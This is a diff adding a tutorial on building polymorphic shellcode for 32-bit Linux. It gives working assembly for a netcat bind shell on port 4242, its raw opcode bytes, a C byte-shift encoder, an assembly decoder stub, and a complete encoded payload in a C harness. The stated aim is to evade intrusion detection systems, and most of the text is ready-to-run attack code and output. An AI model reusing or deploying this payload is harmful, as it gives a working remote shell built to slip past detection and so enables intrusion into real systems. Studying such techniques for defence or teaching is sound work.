@@ -1,0 +1,283 @@
+################################################################################
+#                           Polymorphic shellcode                              #
+################################################################################
+
+  0x00 . What is a shellcode ?
+  0x01 . What is a polymorphic shellcode ?
+  0x02 . Why polymorphic shellcodes ?
+  0x03 . How to ?
+  0x04 . Further steps
+
+## 0x00 . What is a shellcode ?
+################################
+
+A shellcode is a code that launches a shell. These kinds of codes are used by
+malicious people to exploit vulnerabilities. I will describe here how to code
+a network shellcode. It will listen on a specific port and exec a shell. To do
+so, it will exec the program /bin/nc with arguments -lp 4242 and -e /bin/sh
+
+The shellcode is written is assembly program so we can control the whole thing.
+It is aimed to run without knowing where it is located itself in memory, we
+won't use hardcoded addresses for example. I use intel 32 bits with nasm.
+
+A shellcode might not contain zero bytes because of common string handling
+functions that are interpreting zero as the end of the string (the so called
+null terminator). We will zero the bytes that needed to be at runtime.
+
+````````````````````````````````````````````````````````````````````````````````
+; This assembly code translates in C in the form of
+; int main() {
+;   execve("/bin/nc", {"/bin/nc", "-lp4242", "-e/bin/sh"}, NULL);
+; }
+;
+; We can find syscall numbers in /usr/include/asm/unistd_32.h
+
+section .deadcode exec write   ; text section writable at runtime
+global _start                  ; export symbol
+
+_start:                        ; entrypoint
+  jmp short End                ; goto End label
+
+Shellcode:
+  pop esi                      ; esi contain the string in db
+
+  xor eax, eax                 ; zero eax (terminate string and zero envp)
+  mov[esi + 7], al             ; null terminate /bin/nc
+  mov[esi + 15], al            ; null terminate -lp4242
+  mov[esi + 25], al            ; null terminate -e/bin/sh
+
+  mov[esi + 26], esi           ; VALK is replaced by pointer to "/bin/nc"
+
+  lea ebx, [esi + 8]           ; ebx is pointer to "-lp4242"
+  mov[esi +30], ebx            ; HEIM is replaced by pointer to "-lp4242"
+
+  lea ebx, [esi + 16]          ; ebx is pointer to "-e/bin/sh"
+  mov[esi + 34], ebx           ; _PAD is replaced by pointer to "-e/bin/sh"
+
+  mov[esi + 38], eax           ; zero execve envp (replace DING)
+
+  mov al, 11                   ; execve
+  mov ebx, esi                 ; esi is pointing to "/bin/nc"
+  lea ecx, [esi + 26]          ; execve argv
+  lea edx, [esi + 38]          ; execve envp
+  int 0x80                     ; syscall execute
+
+End:
+  call Shellcode                                  ; goto Shellcode label
+  db '/bin/nc0-lp42420-e/bin/sh0VALKHEIM_PADDING' ; avoid (ro)data section.
+  ;   012345678901234567890123456789012345678901  ; esi offset scale
+  ;   0         1         2         3         4
+````````````````````````````````````````````````````````````````````````````````
+
+This shellcode pushes a string on the stack and saves its adress on esi. The
+bytes that needs to be zeroed are the bytes 0x30 (0 in ascii) and the last bytes
+(VALKHEIM_PADDING).
+
+## 0x01 . What is a polymorphic shellcode ?
+############################################
+
+A polymorphic shellcode is a shellcode that mutates itself (modifying its own
+code) keeping the algorithm intact. We can write polymorphic shellcodes in a way
+that it changes itself each time it runs but here, I use a simple
+encoding/decoding of code strategy.
+
+## 0x02 . Why polymorhphic shellcodes ?
+########################################
+
+The reason we use polymorphic shellcode is to bypass intrusion detection systems
+(IDS). The algorithm behaves the same without showing any malicious pattern
+(except the static decoder, and non-interpretable bytes that may be seen as a
+threat anyway).
+
+## 0x03 . How to ?
+###################
+
+The idea behind polymophic shellcode is to partially encode the payload. We'll
+craft a payload with a decoder as an entrypoint that will decode the encoded
+remaining part of the payload. Over the wire, we won't be able to read suspect
+strings. Encoding can be very clever resulting in producing only ascii printable
+characters in the encoded part. Anyway, the embedded decoder must remain valid
+machine code instructions hexadecimal representations and may not be
+interpretable as printable ascii characters.
+
+    +------------------+-----------------------------------------------+
+    | Embeeded decoder | Encoded shellcode                             |
+    +------------------+-----------------------------------------------+
+    ^
+entrypoint
+
+            Figure 1 : Payload representation
+
+-- 0x03.A . Hexadecimal representation of shellcode
+----------------------------------------------------
+
+The first thing we need is to retrieve the hexadecimal representation of our
+shellcode. First thing is to assemble ou payload. To do so, I generally used
+nasm as in nasm -felf32 -o payload.o payload.s
+Next, we can read opcodes using objdump and create a string where each opcode is
+preceeded by \x. I use the following script to do so :
+
+````````````````````````````````````````````````````````````````````````````````
+#!/bin/sh
+
+if [[ $# -eq 0 ]] ; then
+  echo "choose file"
+  exit 2
+fi
+
+SHELLCODE=$(for op in $(objdump -d "$1" -Mintel | grep "^ " | cut -f2);
+do echo -n "\x$op" ; done)
+
+echo "$SHELLCODE"
+echo -e "\nLength : $(echo "$SHELLCODE" | grep -o "x" | wc -l)"
+````````````````````````````````````````````````````````````````````````````````
+
+Given the object file as argument :
+\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76
+\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26
+\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff
+\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x30\x2d\x6c\x70\x34\x32\x34\x32
+\x30\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x30\x56\x41\x4c\x4b\x48
+\x45\x49\x4d\x5f\x50\x41\x44\x44\x49\x4e\x47
+
+Length : 91
+
+We can observe the malicious looking strings by using xxd :
+00000000: eb2a 5e31 c088 4607 8846 0f88 4619 8976  .*^1..F..F..F..v
+00000010: 1a8d 5e08 895e 1e8d 5e10 895e 2289 4626  ..^..^..^..^".F&
+00000020: b00b 89f3 8d4e 1a8d 5626 cd80 e8d1 ffff  .....N..V&......
+00000030: ff2f 6269 6e2f 6e63 302d 6c70 3432 3432  ./bin/nc0-lp4242
+00000040: 302d 652f 6269 6e2f 7368 3056 414c 4b48  0-e/bin/sh0VALKH
+00000050: 4549 4d5f 5041 4444 494e 47              EIM_PADDING
+
+So now that we got our shellcode, we need a way to encode it to remove these
+suspicious strings. The following encoder applies a +2 shift on each byte of the
+payload. (eg: \xeb gives \xed).
+
+
+````````````````````````````````````````````````````````````````````````````````
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int const ac, char const* const* const av)
+{
+  char const * const shellcode = "<insert shellcode here>";
+  char *encode;
+  size_t i;
+  size_t const shellcode_len = strlen(shellcode);
+
+  if ((encode = malloc(shellcode_len)) == NULL)
+    exit(2);
+  /* Add 2 to each byte of payload */
+  for (i = 0 ; i < shellcode_len ; ++i)
+    encode[i] = shellcode[i] + 2;
+  /* Print encoded payload */
+  for (i = 0 ; i < shellcode_len ; ++i)
+    printf("\\x%02x", ((unsigned char *)encode)[i]);
+  /* Print encoded payload length */
+  printf("\nLength : %lu\n", strlen(encode));
+  free(encode);
+  return 0;
+}
+````````````````````````````````````````````````````````````````````````````````
+
+Now the encoded version is :
+\xed\x2c\x60\x33\xc2\x8a\x48\x09\x8a\x48\x11\x8a\x48\x1b\x8b\x78
+\x1c\x8f\x60\x0a\x8b\x60\x20\x8f\x60\x12\x8b\x60\x24\x8b\x48\x28
+\xb2\x0d\x8b\xf5\x8f\x50\x1c\x8f\x58\x28\xcf\x82\xea\xd3\x01\x01
+\x01\x31\x64\x6b\x70\x31\x70\x65\x32\x2f\x6e\x72\x36\x34\x36\x34
+\x32\x2f\x67\x31\x64\x6b\x70\x31\x75\x6a\x32\x58\x43\x4e\x4d\x4a
+\x47\x4b\x4f\x61\x52\x43\x46\x46\x4b\x50\x49
+
+And through xxd :
+00000000: ed2c 6033 c28a 4809 8a48 118a 481b 8b78  .,`3..H..H..H..x
+00000010: 1c8f 600a 8b60 208f 6012 8b60 248b 4828  ..`..` .`..`$.H(
+00000020: b20d 8bf5 8f50 1c8f 5828 cf82 ead3 0101  .....P..X(......
+00000030: 0131 646b 7031 7065 322f 6e72 3634 3634  .1dkp1pe2/nr6464
+00000040: 322f 6731 646b 7031 756a 3258 434e 4d4a  2/g1dkp1uj2XCNMJ
+00000050: 474b 4f61 5243 4646 4b50 49              GKOaRCFFKPI
+
+The suspicious strings disappeared and this encoded version does not contain any
+null byte ! Now we need a decoder. It will prepend the encoded shellcode in the
+final payload. The following assembly should do the job properly :
+
+````````````````````````````````````````````````````````````````````````````````
+section .dcodesub exec
+global _start
+
+_start:
+  jmp short End
+
+InitDecode:
+  pop esi                         ; esi is pointing to shellcode entrypoint
+  xor ecx, ecx                    ; zero loop counter
+  mov cl, 91                      ; 91d is 5bh (length of encoded shellcode)
+
+Decode:
+  sub byte [esi + ecx - 1], 2     ; decode shellcode byte after byte
+  sub cl, 1                       ; decrement loop counter
+  jnz Decode                      ; decode next byte
+  jmp short ShellcodeEntrypoint   ; otherwise, execute decoded shellcode
+
+End:
+  call InitDecode
+
+ShellcodeEntrypoint:
+````````````````````````````````````````````````````````````````````````````````
+
+We reused the jmp Label/pop esi trick to get an address of the stack. The one we
+picked is the address pointing at the beginning of the encoded shellcode. We
+place our esi pointer to it and substract 2 to each byte until we decoded 91
+bytes (the length of the encoded shellcode). We then jump on the first byte of
+the runtime decoded shellcode.
+
+The machine code of this decoded is obtained the same way as the shellcode :
+\xeb\x11\x5e\x31\xc9\xb1\x5b\x80\x6c\x0e\xff\x02\x80\xe9\x01\x75
+\xf6\xeb\x05\xe8\xea\xff\xff\xff
+
+Length : 24
+
+Note this decoder doesn't contain any null byte. The final payload will be
+91+24 = 115 bytes long which is a lot. But hey, the assembly is not optimized
+and easy to understand for the sake of the example.
+
+Now let's try our payload !
+
+````````````````````````````````````````````````````````````````````````````````
+char polymorphic[] =
+  // decoder
+  "\xeb\x11\x5e\x31\xc9\xb1\x5b\x80\x6c\x0e\xff\x02\x80\xe9\x01\x75"
+  "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+  // netcat shellcode
+  "\xed\x2c\x60\x33\xc2\x8a\x48\x09\x8a\x48\x11\x8a\x48\x1b\x8b\x78"
+  "\x1c\x8f\x60\x0a\x8b\x60\x20\x8f\x60\x12\x8b\x60\x24\x8b\x48\x28"
+  "\xb2\x0d\x8b\xf5\x8f\x50\x1c\x8f\x58\x28\xcf\x82\xea\xd3\x01\x01"
+  "\x01\x31\x64\x6b\x70\x31\x70\x65\x32\x2f\x6e\x72\x36\x34\x36\x34"
+  "\x32\x2f\x67\x31\x64\x6b\x70\x31\x75\x6a\x32\x58\x43\x4e\x4d\x4a"
+  "\x47\x4b\x4f\x61\x52\x43\x46\x46\x4b\x50\x49";
+
+
+int main()
+{
+  int (*payload)();
+  payload = polymorphic;
+  payload();
+}
+````````````````````````````````````````````````````````````````````````````````
+
+If you have /bin/nc on your machine, the program will listen on port 4242 where
+wou can send commands :
+$ nc localhost 4242
+whoami
+valkheim
+
+## 0x04 . Further steps
+########################
+
+We can improve the technique in several ways :
+
+  - avoid a static decoder code
+  - use as much as non-malicious recognized printable bytes (using unicode ?)
+  - use stronger encoding
